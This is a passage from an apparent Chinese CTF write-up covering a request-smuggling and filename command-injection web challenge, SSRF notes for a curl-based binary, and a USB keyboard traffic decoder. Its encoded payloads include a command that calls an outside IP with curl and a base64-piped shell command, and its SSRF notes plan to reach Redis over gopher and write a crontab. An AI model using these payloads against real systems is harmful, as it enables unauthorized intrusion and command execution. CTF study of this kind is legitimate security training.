class="line">uri=/admin%252frename?oldname=ed7426a6-a07f-42cb-b8c6-d2610a0a3522.crt%26%26newname=%25%36%30%25%36%33%25%37%35%25%37%32%25%36%63%25%32%30%25%33%31%25%33%31%25%33%38%25%32%65%25%33%32%25%33%35%25%32%65%25%33%31%25%33%31%25%33%31%25%32%65%25%33%31%25%33%30%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%36%30%25%32%65%25%36%33%25%37%32%25%37%34%20HTTP/1.1%0d%0aHost:admin%0d%0a%0d%0aGET%20/</span><br></pre></td></tr></table></figure><p>文件改成功后会有回显<br>然后 触发命令执行 payload要两次urlencode</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/createlink</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2zeh4pj6hmpfx2drs3cs.cloudeci1.ichunqiu.com:8888</span></span><br><span class="line"><span class="attr">Pragma:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=4155e350957161321937ef8e724d9f067ba0d0dc;</span> <span class="string">__jsluid_h=ac54c0c5c9d982815837432778a9eaa5</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br></pre></td></tr></table></figure><p>创建一个crt，将文件名改为echo Y2F0IC9mbGFnCg==|base64 -d|sh -i&gt;&gt;t1.txt</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eci-2zeh4pj6hmpfx2drs3cs.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730; ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914; __jsluid_h=d5688935e29b59feeac61f34a0ba8a3c</span><br><span class="line"><span class="attribute">x-forwarded-for</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-originating-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 589</span><br><span class="line"></span><br><span class="line">uri=/admin%252frename?oldname=ebacdf06-9a1e-4ac4-9f27-557670ca91de.crt%26%26newname=%25%36%30%25%36%35%25%36%33%25%36%38%25%36%66%25%32%30%25%35%39%25%33%32%25%34%36%25%33%30%25%34%39%25%34%33%25%33%39%25%36%64%25%36%32%25%34%37%25%34%36%25%36%65%25%34%33%25%36%37%25%33%64%25%33%64%25%37%63%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%30%25%32%64%25%36%34%25%37%63%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%33%65%25%33%65%25%37%34%25%33%31%25%32%65%25%37%34%25%37%38%25%37%34%25%36%30%25%32%65%25%36%33%25%37%32%25%37%34%20HTTP/1.1%0d%0aHost:admin%0d%0a%0d%0aGET%20/</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/createlink</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2zeh4pj6hmpfx2drs3cs.cloudeci1.ichunqiu.com:8888</span></span><br><span class="line"><span class="attr">Pragma:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=4155e350957161321937ef8e724d9f067ba0d0dc;</span> <span class="string">__jsluid_h=ac54c0c5c9d982815837432778a9eaa5</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br></pre></td></tr></table></figure><p>然后访问文件就有了。</p><p><img src="/2022/05/30/Web-22/bf8b148f-1524-4601-9f95-653bd7e877a8.png" alt></p><h3 id="cmdbrowser"><a href="#cmdbrowser" class="headerlink" title="cmdbrowser"></a>cmdbrowser</h3><p>ssrf</p><p>思考：</p><ul><li>可以直接ssrf 6397 redis端口，可以使用http dict gopher等协议直接探测到，但是有一个实时的随机的简单计算题认证才能继续使用info等redis命令</li><li>但是通过逆向可以看到curl_easy_setopt等标准库里的curl函数不支持类似tty的强大交互能力</li><li>考虑能通过那个实时验证之后是否能够gopher直接写入crontab计划任务后/readflag拿到flag</li></ul><p>ida</p><blockquote><p>均为标准库函数<br>考虑curl_easy_setopt的CVE？</p></blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const <span class="built_in">char</span> **argv, const <span class="built_in">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-98h]</span></span><br><span class="line">  <span class="built_in">char</span> v5<span class="literal">[<span class="number">136</span>]</span>; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  unsigned __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="constructor">__readfsqword(0x28u)</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"please input a URL\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="constructor">__isoc99_scanf(<span class="string">"%100s"</span>)</span>;</span><br><span class="line">  v4 = curl<span class="constructor">_easy_init(<span class="string">"%100s"</span>, <span class="params">v5</span>)</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    curl<span class="constructor">_easy_setopt(<span class="params">v4</span>, '\'\<span class="params">x12</span>', (<span class="params">__int64</span>)</span>v5);</span><br><span class="line">    curl<span class="constructor">_easy_perform(<span class="params">v4</span>)</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/proc/self</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="built_in">home</span>/ctf/cmdbrowser</span><br></pre></td></tr></table></figure><p>/proc/self/environ</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">REMOTE_HOST</span>=<span class="number">10.0</span>.<span class="number">5.136</span></span><br><span class="line"><span class="attr">HOSTNAME</span>=engine-<span class="number">1</span>SHLVL=<span class="number">1</span></span><br><span class="line"><span class="attr">HOME</span>=/root</span><br><span class="line"><span class="attr">_</span>=/etc/init.d/xinetd</span><br><span class="line"><span class="attr">TERM</span>=xterm</span><br><span class="line"><span class="attr">PATH</span>=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="attr">PWD</span>=/</span><br><span class="line"><span class="attr">KATA_CONTAINER</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">SOCAT_PID</span>=<span class="number">129</span></span><br><span class="line"><span class="attr">SOCAT_PPID</span>=<span class="number">129</span></span><br><span class="line"><span class="attr">SOCAT_VERSION</span>=<span class="number">1.7</span>.<span class="number">3.2</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">file</span>:///etc/apache2/sites-available/000-default.conf</span><br><span class="line"><span class="section">&lt;VirtualHost *:80&gt;</span></span><br><span class="line"><span class="comment"># The ServerName directive sets the request scheme, hostname and port that</span></span><br><span class="line"><span class="comment"># the server uses to identify itself. This is used when creating</span></span><br><span class="line"><span class="comment"># redirection URLs. In the context of virtual hosts, the ServerName</span></span><br><span class="line"><span class="comment"># specifies what hostname must appear in the request's Host: header to</span></span><br><span class="line"><span class="comment"># match this virtual host. For the default virtual host (this file) this</span></span><br><span class="line"><span class="comment"># value is not decisive as it is used as a last resort host regardless.</span></span><br><span class="line"><span class="comment"># However, you must set it for any further virtual host explicitly.</span></span><br><span class="line"><span class="comment">#ServerName www.example.com</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">ServerAdmin</span> webmaster@localhost</span><br><span class="line"><span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment"># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span></span><br><span class="line"><span class="comment"># error, crit, alert, emerg.</span></span><br><span class="line"><span class="comment"># It is also possible to configure the loglevel for particular</span></span><br><span class="line"><span class="comment"># modules, e.g.</span></span><br><span class="line"><span class="comment">#LogLevel info ssl:warn</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line"><span class="attribute">CustomLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"></span><br><span class="line"><span class="comment"># For most configuration files from conf-available/, which are</span></span><br><span class="line"><span class="comment"># enabled or disabled at a global level, it is possible to</span></span><br><span class="line"><span class="comment"># include a line for only one particular virtual host. For example the</span></span><br><span class="line"><span class="comment"># following line enables the CGI configuration for this host only</span></span><br><span class="line"><span class="comment"># after it has been globally disabled with "a2disconf".</span></span><br><span class="line"><span class="comment">#Include conf-available/serve-cgi-bin.conf</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span></span><br></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="string">///etc/crontab</span></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=<span class="string">/bin/sh</span></span><br><span class="line">PATH=<span class="string">/usr/local/sbin</span>:<span class="string">/usr/local/bin</span>:<span class="string">/sbin</span>:<span class="string">/bin</span>:<span class="string">/usr/sbin</span>:<span class="string">/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow usercommand</span></span><br><span class="line">17 ** * *root    <span class="keyword">cd</span> / &amp;&amp; run-parts <span class="params">--report</span> <span class="string">/etc/cron.hourly</span></span><br><span class="line">25 6* * *roottest -x <span class="string">/usr/sbin/anacron</span> || <span class="params">( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span></span><br><span class="line">47 6* * 7roottest -x <span class="string">/usr/sbin/anacron</span> || <span class="params">( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span></span><br><span class="line">52 61 * *roottest -x <span class="string">/usr/sbin/anacron</span> || <span class="params">( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h3><ol><li>提取2.8.1的流量解密<br>(usb.dst == “2.8.1”  ) || (usb.src == “2.8.1”)<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tshark</span> <span class="selector-tag">-r</span> 2<span class="selector-class">.8</span><span class="selector-class">.1</span><span class="selector-class">.pcapng</span> <span class="selector-tag">-T</span> <span class="selector-tag">fields</span> <span class="selector-tag">-e</span> <span class="selector-tag">usb</span><span class="selector-class">.capdata</span> &gt; <span class="selector-tag">usbdata2</span><span class="selector-class">.8</span><span class="selector-class">.1</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"></span><br><span class="line"><span class="comment">#declare -A lcasekey</span></span><br><span class="line">lcasekey = &#123;&#125;</span><br><span class="line"><span class="comment">#declare -A ucasekey</span></span><br><span class="line">ucasekey = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#associate USB HID scan codes with keys</span></span><br><span class="line"><span class="comment">#ex: key 4  can be both "a" and "A", depending on if SHIFT is held down</span></span><br><span class="line">lcasekey[<span class="number">4</span>]=<span class="string">"a"</span>;           ucasekey[<span class="number">4</span>]=<span class="string">"A"</span></span><br><span class="line">lcasekey[<span class="number">5</span>]=<span class="string">"b"</span>;           ucasekey[<span class="number">5</span>]=<span class="string">"B"</span></span><br><span class="line">lcasekey[<span class="number">6</span>]=<span class="string">"c"</span>;           ucasekey[<span class="number">6</span>]=<span class="string">"C"</span></span><br><span class="line">lcasekey[<span class="number">7</span>]=<span class="string">"d"</span>;           ucasekey[<span class="number">7</span>]=<span class="string">"D"</span></span><br><span class="line">lcasekey[<span class="number">8</span>]=<span class="string">"e"</span>;           ucasekey[<span class="number">8</span>]=<span class="string">"E"</span></span><br><span class="line">lcasekey[<span class="number">9</span>]=<span class="string">"f"</span>;           ucasekey[<span class="number">9</span>]=<span class="string">"F"</span></span><br><span class="line">lcasekey[<span class="number">10</span>]=<span class="string">"g"</span>;          ucasekey[<span class="number">10</span>]=<span class="string">"G"</span></span><br><span class="line">lcasekey[<span class="number">11</span>]=<span class="string">"h"</span>;          ucasekey[<span class="number">11</span>]=<span class="string">"H"</span></span><br><span class="line">lcasekey[<span class="number">12</span>]=<span class="string">"i"</span>;          ucasekey[<span class="number">12</span>]=<span class="string">"I"</span></span><br><span class="line">lcasekey[<span class="number">13</span>]=<span class="string">"j"</span>;          ucasekey[<span class="number">13</span>]=<span class="string">"J"</span></span><br><span class="line">lcasekey[<span class="number">14</span>]=<span class="string">"k"</span>;          ucasekey[<span class="number">14</span>]=<span class="string">"K"</span></span><br><span class="line">lcasekey[<span class="number">15</span>]=<span class="string">"l"</span>;          ucasekey[<span class="number">15</span>]=<span class="string">"L"</span></span><br><span class="line">lcasekey[<span class="number">16</span>]=<span class="string">"m"</span>;          ucasekey[<span class="number">16</span>]=<span class="string">"M"</span></span><br><span class="line">lcasekey[<span class="number">17</span>]=<span class="string">"n"</span>;          ucasekey[<span class="number">17</span>]=<span class="string">"N"</span></span><br><span class="line">lcasekey[<span class="number">18</span>]=<span class="string">"o"</span>;          ucasekey[<span class="number">18</span>]=<span class="string">"O"</span></span><br><span class="line">lcasekey[<span class="number">19</span>]=<span class="string">"p"</span>;          ucasekey[<span class="number">19</span>]=<span class="string">"P"</span></span><br><span class="line">lcasekey[<span class="number">20</span>]=<span class="string">"q"</span>;          ucasekey[<span class="number">20</span>]=<span class="string">"Q"</span></span><br><span class="line">lcasekey[<span class="number">21</span>]=<span class="string">"r"</span>;          ucasekey[<span class="number">21</span>]=<span class="string">"R"</span></span><br><span class="line">lcasekey[<span class="number">22</span>]=<span class="string">"s"</span>;          ucasekey[<span class="number">22</span>]=<span class="string">"S"</span></span><br><span class="line">lcasekey[<span class="number">23</span>]=<span class="string">"t"</span>;          ucasekey[<span class="number">23</span>]=<span class="string">"T"</span></span><br><span class="line">lcasekey[<span class="number">24</span>]=<span class="string">"u"</span>;          ucasekey[<span class="number">24</span>]=<span class="string">"U"</span></span><br><span class="line">lcasekey[<span class="number">25</span>]=<span class="string">"v"</span>;          ucasekey[<span class="number">25</span>]=<span class="string">"V"</span></span><br><span class="line">lcasekey[<span class="number">26</span>]=<span class="string">"w"</span>;          ucasekey[<span class="number">26</span>]=<span class="string">"W"</span></span><br><span class="line">lcasekey[<span class="number">27</span>]=<span class="string">"x"</span>;          ucasekey[<span class="number">27</span>]=<span class="string">"X"</span></span><br><span class="line">lcasekey[<span class="number">28</span>]=<span class="string">"y"</span>;          ucasekey[<span class="number">28</span>]=<span class="string">"Y"</span></span><br><span class="line">lcasekey[<span class="number">29</span>]=<span class="string">"z"</span>;          ucasekey[<span class="number">29</span>]=<span class="string">"Z"</span></span><br><span class="line">lcasekey[<span class="number">30</span>]=<span class="string">"1"</span>;          ucasekey[<span class="number">30</span>]=<span class="string">"!"</span></span><br><span class="line">lcasekey[<span class="number">31</span>]=<span class="string">"2"</span>;          ucasekey[<span class="number">31</span>]=<span class="string">"@"</span></span><br><span class="line">lcasekey[<span class="number">32</span>]=<span class="string">"3"</span>;          ucasekey[<span class="number">32</span>]=<span class="string">"#"</span></span><br><span class="line">lcasekey[<span class="number">33</span>]=<span class="string">"4"</span>;          ucasekey[<span class="number">33</span>]=<span class="string">"$"</span></span><br><span class="line">lcasekey[<span class="number">34</span>]=<span class="string">"5"</span>;          ucasekey[<span class="number">34</span>]=<span class="string">"%"</span></span><br><span class="line">lcasekey[<span class="number">35</span>]=<span class="string">"6"</span>;          ucasekey[<span class="number">35</span>]=<span class="string">"^"</span></span><br><span class="line">lcasekey[<span class="number">36</span>]=<span class="string">"7"</span>;          ucasekey[<span class="number">36</span>]=<span class="string">"&amp;"</span></span><br><span class="line">lcasekey[<span class="number">37</span>]=<span class="string">"8"</span>;          ucasekey[<span class="number">37</span>]=<span class="string">"*"</span></span><br><span class="line">lcasekey[<span class="number">38</span>]=<span class="string">"9"</span>;          ucasekey[<span class="number">38</span>]=<span class="string">"("</span></span><br><span class="line">lcasekey[<span class="number">39</span>]=<span class="string">"0"</span>;          ucasekey[<span class="number">39</span>]=<span class="string">")"</span></span><br><span class="line">lcasekey[<span class="number">40</span>]=<span class="string">"&lt;Enter&gt;"</span>;      ucasekey[<span class="number">40</span>]=<span class="string">"&lt;Enter&gt;"</span></span><br><span class="line">lcasekey[<span class="number">41</span>]=<span class="string">"&lt;esc&gt;"</span>;        ucasekey[<span class="number">41</span>]=<span class="string">"&lt;esc&gt;"</span></span><br><span class="line">lcasekey[<span class="number">42</span>]=<span class="string">"&lt;del&gt;"</span>;        ucasekey[<span class="number">42</span>]=<span class="string">"&lt;del&gt;"</span></span><br><span class="line">lcasekey[<span class="number">43</span>]=<span class="string">"&lt;tab&gt;"</span>;        ucasekey[<span class="number">43</span>]=<span class="string">"&lt;tab&gt;"</span></span><br><span class="line">lcasekey[<span class="number">44</span>]=<span class="string">"&lt;space&gt;"</span>;      ucasekey[<span class="number">44</span>]=<span class="string">"&lt;space&gt;"</span></span><br><span class="line">lcasekey[<span class="number">45</span>]=<span class="string">"-"</span>;          ucasekey[<span class="number">45</span>]=<span class="string">"_"</span></span><br><span class="line">lcasekey[<span class="number">46</span>]=<span class="string">"="</span>;          ucasekey[<span class="number">46</span>]=<span class="string">"+"</span></span><br><span class="line">lcasekey[<span class="number">47</span>]=<span class="string">"["</span>;          ucasekey[<span class="number">47</span>]=<span class="string">"&#123;"</span></span><br><span class="line">lcasekey[<span class="number">48</span>]=<span class="string">"]"</span>;          ucasekey[<span class="number">48</span>]=<span class="string">"&#125;"</span></span><br><span class="line">lcasekey[<span class="number">49</span>]=<span class="string">"\\"</span>;         ucasekey[<span class="number">49</span>]=<span class="string">"|"</span></span><br><span class="line">lcasekey[<span class="number">50</span>]=<span class="string">" "</span>;          ucasekey[<span class="number">50</span>]=<span class="string">" "</span></span><br><span class="line">lcasekey[<span class="number">51</span>]=<span class="string">";"</span>;          ucasekey[<span class="number">51</span>]=<span class="string">":"</span></span><br><span class="line">lcasekey[<span class="number">52</span>]=<span class="string">"'"</span>;          ucasekey[<span class="number">52</span>]=<span class="string">"\""</span></span><br><span class="line">lcasekey[<span class="number">53</span>]=<span class="string">"`"</span>;          ucasekey[<span class="number">53</span>]=<span class="string">"~"</span></span><br><span class="line">lcasekey[<span class="number">54</span>]=<span class="string">","</span>;          ucasekey[<span class="number">54</span>]=<span class="string">"&lt;"</span></span><br><span class="line">lcasekey[<span class="number">55</span>]=<span 